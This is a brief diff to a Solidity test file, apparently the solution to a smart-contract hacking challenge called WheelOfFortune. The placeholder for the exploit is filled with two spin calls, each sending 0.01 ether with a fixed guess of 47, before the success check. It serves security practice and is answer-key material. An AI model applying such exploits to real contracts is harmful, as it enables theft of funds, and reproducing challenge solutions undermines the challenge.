@@ -15,8 +15,8 @@ contract WheelOfFortuneTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        instance.spin{value: 0.01 ether}(47);
+        instance.spin{value: 0.01 ether}(47);
         checkSuccess();
     }
 
